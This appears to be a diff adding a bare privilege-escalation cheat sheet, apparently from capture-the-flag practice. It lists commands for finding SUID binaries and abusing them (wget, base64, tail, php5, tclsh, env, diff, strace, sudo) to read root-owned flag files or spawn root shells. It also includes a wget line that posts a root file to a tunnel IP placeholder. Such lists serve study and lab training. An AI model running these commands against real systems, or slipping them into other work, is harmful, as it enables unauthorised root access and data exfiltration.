@@ -1,0 +1,28 @@
+------PRIVESC------
+find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
+
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<Tunnel IP>:4445
+
+/usr/bin/cut -d "" -f1 /root/flag.txt
+
+/usr/bin/base64 /root/flag.txt | base64 --decode
+
+/usr/bin/tail /root/flag.txt
+
+/usr/bin/ul /root/flag.txt
+
+/usr/bin/php5 -r "pcntl_exec('/bin/sh');"
+
+/usr/bin/file -m /root/flag.txt
+
+/usr/bin/tclsh8.5
+%exec cat /root/flag.txt
+
+/usr/bin/env /bin/sh
+
+/usr/bin/diff --line-format=%L /dev/null /root/flag.txt
+
+/usr/bin/strace -o /dev/null /bin/sh
+
+sudo -l
+sudo /bin/bash
